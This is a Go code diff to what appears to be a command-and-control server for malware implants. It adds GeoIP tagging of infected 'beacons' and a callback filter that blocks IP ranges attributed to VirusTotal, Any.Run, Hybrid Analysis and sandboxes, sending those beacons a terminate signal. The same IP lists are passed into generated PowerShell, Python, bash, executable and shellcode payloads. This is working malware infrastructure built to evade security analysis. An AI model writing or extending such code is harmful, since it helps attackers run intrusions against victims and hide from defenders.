@@ -30,6 +30,130 @@ var (
 	alMutex         sync.Mutex
 )
 
+// ==================== GeoIP Lookup ====================
+
+var (
+	geoCache   = make(map[string][2]string) // ip -> [country, countryCode]
+	geoCacheMu sync.RWMutex
+)
+
+func lookupGeoIP(ip string) (string, string) {
+	parsedIP := net.ParseIP(ip)
+	if parsedIP == nil || parsedIP.IsLoopback() || parsedIP.IsPrivate() {
+		return "", ""
+	}
+
+	geoCacheMu.RLock()
+	if cached, ok := geoCache[ip]; ok {
+		geoCacheMu.RUnlock()
+		return cached[0], cached[1]
+	}
+	geoCacheMu.RUnlock()
+
+	url := fmt.Sprintf("http://ip-api.com/json/%s?fields=status,country,countryCode", ip)
+	client := &http.Client{Timeout: 5 * time.Second}
+	resp, err := client.Get(url)
+	if err != nil {
+		return "", ""
+	}
+	defer resp.Body.Close()
+
+	var result struct {
+		Status      string `json:"status"`
+		Country     string `json:"country"`
+		CountryCode string `json:"countryCode"`
+	}
+	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
+		return "", ""
+	}
+
+	country, code := "", ""
+	if result.Status == "success" {
+		country = result.Country
+		code = result.CountryCode
+	}
+
+	geoCacheMu.Lock()
+	geoCache[ip] = [2]string{country, code}
+	geoCacheMu.Unlock()
+
+	return country, code
+}
+
+// ==================== Callback Filter ====================
+
+var (
+	filterMutex sync.RWMutex
+
+	// IP whitelist: if non-empty, only these IPs/CIDRs are allowed
+	ipWhitelist []string
+
+	// IP blacklist: these IPs/CIDRs are always rejected
+	ipBlacklist = []string{
+		// Known VirusTotal scanner ranges
+		"35.232.0.0/16", "34.96.0.0/16", "35.240.0.0/16",
+		// Known Any.Run ranges
+		"195.123.241.0/24",
+		// Known Hybrid Analysis ranges
+		"92.60.36.0/24",
+		// Common sandbox exit nodes
+		"20.99.160.0/24", "20.99.184.0/24",
+	}
+)
+
+// isIPBlocked checks if the given IP should be filtered
+func isIPBlocked(ip string) bool {
+	filterMutex.RLock()
+	defer filterMutex.RUnlock()
+
+	parsedIP := net.ParseIP(ip)
+	if parsedIP == nil {
+		return false
+	}
+
+	// If whitelist is set, IP must be in whitelist
+	if len(ipWhitelist) > 0 {
+		allowed := false
+		for _, entry := range ipWhitelist {
+			if matchIPEntry(parsedIP, entry) {
+				allowed = true
+				break
+			}
+		}
+		if !allowed {
+			return true
+		}
+	}
+
+	// Check blacklist
+	for _, entry := range ipBlacklist {
+		if matchIPEntry(parsedIP, entry) {
+			return true
+		}
+	}
+
+	return false
+}
+
+// matchIPEntry matches an IP against an entry which can be a single IP or CIDR
+func matchIPEntry(ip net.IP, entry string) bool {
+	if strings.Contains(entry, "/") {
+		_, cidr, err := net.ParseCIDR(entry)
+		if err != nil {
+			return false
+		}
+		return cidr.Contains(ip)
+	}
+	return ip.Equal(net.ParseIP(entry))
+}
+
+// filterResponse sends a termination signal so the beacon exits permanently
+func filterResponse(w http.ResponseWriter) {
+	w.Header().Set("Content-Type", "text/plain")
+	w.WriteHeader(http.StatusOK)
+	w.Write([]byte("__TERMINATE__"))
+}
+
 // --- Helper Functions ---
 
 // extractIP removes the port from RemoteAddr (e.g. "127.0.0.1:12345" -> "127.0.0.1")
@@ -323,6 +447,15 @@ func tcpReadMsg(conn net.Conn) ([]byte, error) {
 func handleTCPBeaconConn(conn net.Conn, listenerID string) {
 	defer conn.Close()
 	remoteIP := extractIP(conn.RemoteAddr().String())
+
+	// Callback filter: check IP
+	if isIPBlocked(remoteIP) {
+		addLog("FILTER", fmt.Sprintf("TCP_IP_BLOCKED: %s", remoteIP))
+		// Send terminate signal so beacon exits permanently
+		tcpWriteMsg(conn, TCPMsg{Type: "terminate"})
+		return
+	}
+
 	var beaconID string
 
 	for {
@@ -350,12 +483,14 @@ func handleTCPBeaconConn(conn net.Conn, listenerID string) {
 				tcpWriteMsg(conn, TCPMsg{Type: "ack", Data: json.RawMessage(`"ERROR"`)})
 				continue
 			}
+
 			beaconID = regData.BeaconID
 
 			var client Client
 			result := db.First(&client, "id = ?", beaconID)
 			if result.Error != nil {
 				// New beacon
+				tcpCountry, tcpCountryCode := lookupGeoIP(remoteIP)
 				client = Client{
 					ID:          beaconID,
 					Name:        "NODE_" + beaconID[:8],
@@ -375,9 +510,11 @@ func handleTCPBeaconConn(conn net.Conn, listenerID string) {
 					LastCheck:   time.Now(),
 					Sleep:       60,
 					Jitter:      10,
+					Country:     tcpCountry,
+					CountryCode: tcpCountryCode,
 				}
 				db.Create(&client)
-				addLog("C2", fmt.Sprintf("NEW_TCP_BEACON: %s@%s from %s", regData.Username, regData.Hostname, remoteIP))
+				addLog("C2", fmt.Sprintf("NEW_TCP_BEACON: %s@%s from %s [%s]", regData.Username, regData.Hostname, remoteIP, tcpCountryCode))
 
 				event := map[string]interface{}{
 					"type": "new_beacon", "beacon_id": beaconID,
@@ -468,13 +605,19 @@ func handleBeaconCheckin(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Access-Control-Allow-Origin", "*")
 	w.Header().Set("Access-Control-Allow-Headers", "*")
 
-	// OPTIONS preflight
 	if r.Method == http.MethodOptions {
 		w.WriteHeader(http.StatusOK)
 		return
 	}
 
-	// POST = result submission or registration
+	// Callback filter: check IP
+	remoteIP := extractIP(r.RemoteAddr)
+	if isIPBlocked(remoteIP) {
+		addLog("FILTER", fmt.Sprintf("IP_BLOCKED: %s", remoteIP))
+		filterResponse(w)
+		return
+	}
+
 	if r.Method == http.MethodPost {
 		body, err := io.ReadAll(r.Body)
 		if err != nil {
@@ -483,7 +626,6 @@ func handleBeaconCheckin(w http.ResponseWriter, r *http.Request) {
 		}
 		defer r.Body.Close()
 
-		// Try to parse as CheckInData (registration/info update)
 		var regData CheckInData
 		if err := json.Unmarshal(body, &regData); err == nil && regData.BeaconID != "" && regData.Hostname != "" {
 			handleBeaconRegistration(w, r, regData)
@@ -535,19 +677,23 @@ func handleBeaconCheckin(w http.ResponseWriter, r *http.Request) {
 		db.Save(&client)
 	} else if clientID != "UNKNOWN" {
 		// New beacon registration (basic - without JSON body)
+		basicIP := extractIP(r.RemoteAddr)
+		basicCountry, basicCountryCode := lookupGeoIP(basicIP)
 		client = Client{
-			ID:        clientID,
-			Name:      "NODE_" + clientID[:8],
-			IP:        extractIP(r.RemoteAddr),
-			Status:    "online",
-			OS:        beaconOS,
-			FirstSeen: time.Now(),
-			LastCheck: time.Now(),
-			Sleep:     60,
-			Jitter:    10,
+			ID:          clientID,
+			Name:        "NODE_" + clientID[:8],
+			IP:          basicIP,
+			Status:      "online",
+			OS:          beaconOS,
+			FirstSeen:   time.Now(),
+			LastCheck:   time.Now(),
+			Sleep:       60,
+			Jitter:      10,
+			Country:     basicCountry,
+			CountryCode: basicCountryCode,
 		}
 		db.Create(&client)
-		addLog("C2", fmt.Sprintf("NEW_BEACON_REGISTERED: %s from %s", clientID, extractIP(r.RemoteAddr)))
+		addLog("C2", fmt.Sprintf("NEW_BEACON_REGISTERED: %s from %s [%s]", clientID, basicIP, basicCountryCode))
 
 		// Broadcast new beacon event
 		event := map[string]interface{}{
@@ -626,10 +772,12 @@ func handleBeaconRegistration(w http.ResponseWriter, r *http.Request, data Check
 		if beaconJitter < 0 {
 			beaconJitter = 10
 		}
+		clientIP := extractIP(r.RemoteAddr)
+		country, countryCode := lookupGeoIP(clientIP)
 		client = Client{
 			ID:          data.BeaconID,
 			Name:        name,
-			IP:          extractIP(r.RemoteAddr),
+			IP:          clientIP,
 			InternalIP:  data.InternalIP,
 			Status:      "online",
 			OS:          data.OS,
@@ -644,10 +792,12 @@ func handleBeaconRegistration(w http.ResponseWriter, r *http.Request, data Check
 			LastCheck:   time.Now(),
 			Sleep:       beaconSleep,
 			Jitter:      beaconJitter,
+			Country:     country,
+			CountryCode: countryCode,
 		}
 		db.Create(&client)
-		addLog("C2", fmt.Sprintf("NEW_BEACON: %s@%s (%s) PID:%d [%s]",
-			data.Username, data.Hostname, extractIP(r.RemoteAddr), data.PID, data.OS))
+		addLog("C2", fmt.Sprintf("NEW_BEACON: %s@%s (%s) PID:%d [%s] [%s]",
+			data.Username, data.Hostname, clientIP, data.PID, data.OS, countryCode))
 
 		// Broadcast new beacon event
 		event := map[string]interface{}{
@@ -1055,6 +1205,8 @@ func handleGeneratePayload(c *gin.Context) {
 		Arch         string `json:"arch"`
 		Sleep        int    `json:"sleep"`
 		Jitter       int    `json:"jitter"`
+		AllowedIPs   string `json:"allowed_ips"`
+		BlockedIPs   string `json:"blocked_ips"`
 	}
 
 	if err := c.ShouldBindJSON(&req); err != nil {
@@ -1110,6 +1262,10 @@ func handleGeneratePayload(c *gin.Context) {
 	newID := "P-" + uuid.New().String()[:8]
 	beaconID := uuid.New().String()
 
+	// Prepare IP filter values (use | separator for ldflags compatibility)
+	allowedIPs := strings.ReplaceAll(strings.TrimSpace(req.AllowedIPs), ",", "|")
+	blockedIPs := strings.ReplaceAll(strings.TrimSpace(req.BlockedIPs), ",", "|")
+
 	// Determine file extension
 	ext := ""
 	switch req.Type {
@@ -1153,28 +1309,28 @@ func handleGeneratePayload(c *gin.Context) {
 			c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "PowerShell stager does not support TCP protocol. Use HTTP listener."})
 			return
 		}
-		if err := generateFromTemplate("implants/beacon.ps1", dstFile, c2URL, beaconID, sleepVal, jitterVal, proto); err != nil {
+		if err := generateFromTemplate("implants/beacon.ps1", dstFile, c2URL, beaconID, sleepVal, jitterVal, proto, allowedIPs, blockedIPs); err != nil {
 			addLog("ERR", "PS1_GEN_FAILED: "+err.Error())
 			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
 			return
 		}
 
 	case "python":
-		if err := generateFromTemplate("implants/beacon.py", dstFile, c2URL, beaconID, sleepVal, jitterVal, proto); err != nil {
+		if err := generateFromTemplate("implants/beacon.py", dstFile, c2URL, beaconID, sleepVal, jitterVal, proto, allowedIPs, blockedIPs); err != nil {
 			addLog("ERR", "PYTHON_GEN_FAILED: "+err.Error())
 			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
 			return
 		}
 
 	case "bash":
-		if err := generateFromTemplate("implants/beacon.sh", dstFile, c2URL, beaconID, sleepVal, jitterVal, proto); err != nil {
+		if err := generateFromTemplate("implants/beacon.sh", dstFile, c2URL, beaconID, sleepVal, jitterVal, proto, allowedIPs, blockedIPs); err != nil {
 			addLog("ERR", "BASH_GEN_FAILED: "+err.Error())
 			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
 			return
 		}
 
 	case "executable":
-		if err := buildGoImplant(dstFile, req.OS, req.Arch, c2URL, beaconID, sleepVal, jitterVal, proto); err != nil {
+		if err := buildGoImplant(dstFile, req.OS, req.Arch, c2URL, beaconID, sleepVal, jitterVal, proto, allowedIPs, blockedIPs); err != nil {
 			addLog("ERR", "BUILD_FAILED: "+err.Error())
 			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
 			return
@@ -1188,7 +1344,7 @@ func handleGeneratePayload(c *gin.Context) {
 		}
 		tmpFileSC := filepath.Join(dstDir, fmt.Sprintf("%s_tmp%s", newID, tmpExtSC))
 
-		if err := buildGoImplant(tmpFileSC, req.OS, req.Arch, c2URL, beaconID, sleepVal, jitterVal, proto); err != nil {
+		if err := buildGoImplant(tmpFileSC, req.OS, req.Arch, c2URL, beaconID, sleepVal, jitterVal, proto, allowedIPs, blockedIPs); err != nil {
 			addLog("ERR", "SHELLCODE_BUILD_FAILED: "+err.Error())
 			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
 			return
@@ -1216,7 +1372,7 @@ func handleGeneratePayload(c *gin.Context) {
 		}
 		tmpFileEmbed := filepath.Join(dstDir, fmt.Sprintf("%s_tmp%s", newID, tmpExtEmbed))
 
-		if err := buildGoImplant(tmpFileEmbed, req.OS, req.Arch, c2URL, beaconID, sleepVal, jitterVal, proto); err != nil {
+		if err := buildGoImplant(tmpFileEmbed, req.OS, req.Arch, c2URL, beaconID, sleepVal, jitterVal, proto, allowedIPs, blockedIPs); err != nil {
 			addLog("ERR", "SHELLCODE_EMBED_BUILD_FAILED: "+err.Error())
 			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
 			return
@@ -1281,7 +1437,7 @@ func handleGeneratePayload(c *gin.Context) {
 }
 
 // generateFromTemplate reads a template file and replaces placeholders
-func generateFromTemplate(tmplPath, dstFile, c2URL, beaconID string, sleep, jitter int, proto string) error {
+func generateFromTemplate(tmplPath, dstFile, c2URL, beaconID string, sleep, jitter int, proto, allowedIPs, blockedIPs string) error {
 	content, err := os.ReadFile(tmplPath)
 	if err != nil {
 		return fmt.Errorf("TEMPLATE_NOT_FOUND: %s", tmplPath)
@@ -1292,11 +1448,13 @@ func generateFromTemplate(tmplPath, dstFile, c2URL, beaconID string, sleep, jitt
 	script = strings.ReplaceAll(script, "{{SLEEP}}", strconv.Itoa(sleep))
 	script = strings.ReplaceAll(script, "{{JITTER}}", strconv.Itoa(jitter))
 	script = strings.ReplaceAll(script, "{{PROTO}}", proto)
+	script = strings.ReplaceAll(script, "{{ALLOWED_IPS}}", allowedIPs)
+	script = strings.ReplaceAll(script, "{{BLOCKED_IPS}}", blockedIPs)
 	return os.WriteFile(dstFile, []byte(script), 0644)
 }
 
 // buildGoImplant compiles the Go implant for the specified OS/Arch
-func buildGoImplant(dstFile, targetOS, targetArch, c2URL, beaconID string, sleep, jitter int, proto string) error {
+func buildGoImplant(dstFile, targetOS, targetArch, c2URL, beaconID string, sleep, jitter int, proto, allowedIPs, blockedIPs string) error {
 	srcDir := "implants"
 	if _, err := os.Stat(filepath.Join(srcDir, "main.go")); os.IsNotExist(err) {
 		return fmt.Errorf("SOURCE_NOT_FOUND")
@@ -1310,8 +1468,8 @@ func buildGoImplant(dstFile, targetOS, targetArch, c2URL, beaconID string, sleep
 	if targetOS == "windows" || (targetOS == "" && runtime.GOOS == "windows") {
 		ldflagsBase = "-s -w -H windowsgui"
 	}
-	ldflags := fmt.Sprintf("%s -X main.C2_URL=%s -X main.BEACON_ID=%s -X main.SLEEP_INTERVAL=%d -X main.JITTER=%d -X main.PROTO=%s",
-		ldflagsBase, c2URL, beaconID, sleep, jitter, proto)
+	ldflags := fmt.Sprintf("%s -X main.C2_URL=%s -X main.BEACON_ID=%s -X main.SLEEP_INTERVAL=%d -X main.JITTER=%d -X main.PROTO=%s -X main.ALLOWED_IPS=%s -X main.BLOCKED_IPS=%s",
+		ldflagsBase, c2URL, beaconID, sleep, jitter, proto, allowedIPs, blockedIPs)
 
 	cmd := exec.Command("go", "build",
 		"-trimpath",
@@ -1384,36 +1542,32 @@ func handleGetFiles(c *gin.Context) {
 		return
 	}
 
-	// Check if there's a recent file listing result
 	path := c.Query("path")
-	cmd := "__FILELIST__"
-	if path != "" {
-		cmd = "__FILELIST__ " + path
+	if path == "" {
+		path = "."
 	}
+	cmd := "__FILELIST__ " + path
 
+	// Check for a recent cached result
 	var task Task
-	err := db.Where("client_id = ? AND command LIKE ? AND status = ? AND created_at > ?",
-		clientID, cmd+"%", "completed", time.Now().Add(-10*time.Minute)).
+	err := db.Where("client_id = ? AND command = ? AND status = ? AND created_at > ?",
+		clientID, cmd, "completed", time.Now().Add(-10*time.Minute)).
 		Order("created_at desc").First(&task).Error
 
 	if err == nil && task.Result != "" {
-		var files []map[string]interface{}
-		if jsonErr := json.Unmarshal([]byte(task.Result), &files); jsonErr == nil {
-			c.JSON(http.StatusOK, APIResponse{Status: "success", Data: files})
+		var result map[string]interface{}
+		if jsonErr := json.Unmarshal([]byte(task.Result), &result); jsonErr == nil {
+			c.JSON(http.StatusOK, APIResponse{Status: "success", Data: result})
 			return
 		}
 	}
 
-	// Queue a file list task
+	// Queue file list task using the cross-platform __FILELIST__ command
 	taskID := "T-" + uuid.New().String()[:8]
-	listCmd := "dir /b"
-	if path != "" {
-		listCmd = "dir /b \"" + path + "\""
-	}
 	newTask := &Task{
 		ID:        taskID,
 		ClientID:  clientID,
-		Command:   listCmd,
+		Command:   cmd,
 		Status:    "pending",
 		CreatedAt: time.Now(),
 	}
@@ -1422,9 +1576,7 @@ func handleGetFiles(c *gin.Context) {
 	c.JSON(http.StatusOK, APIResponse{
 		Status:  "success",
 		Message: "FILE_LIST_QUEUED",
-		Data: map[string]string{
-			"task_id": taskID,
-		},
+		Data:    map[string]string{"task_id": taskID},
 	})
 }
 
@@ -3066,4 +3218,44 @@ func handleRemoteFMDelete(c *gin.Context) {
 	}
 
 	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "DELETED", Data: data})
+}
+
+// ==================== Callback Filter API ====================
+
+func handleGetFilters(c *gin.Context) {
+	filterMutex.RLock()
+	defer filterMutex.RUnlock()
+
+	c.JSON(http.StatusOK, APIResponse{
+		Status: "success",
+		Data: map[string]interface{}{
+			"ip_whitelist": ipWhitelist,
+			"ip_blacklist": ipBlacklist,
+		},
+	})
+}
+
+func handleUpdateFilters(c *gin.Context) {
+	var req struct {
+		IPWhitelist []string `json:"ip_whitelist"`
+		IPBlacklist []string `json:"ip_blacklist"`
+	}
+
+	if err := c.ShouldBindJSON(&req); err != nil {
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
+		return
+	}
+
+	filterMutex.Lock()
+	if req.IPWhitelist != nil {
+		ipWhitelist = req.IPWhitelist
+	}
+	if req.IPBlacklist != nil {
+		ipBlacklist = req.IPBlacklist
+	}
+	filterMutex.Unlock()
+
+	addLog("FILTER", fmt.Sprintf("FILTERS_UPDATED: whitelist=%d blacklist=%d",
+		len(ipWhitelist), len(ipBlacklist)))
+	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "FILTERS_UPDATED"})
 }
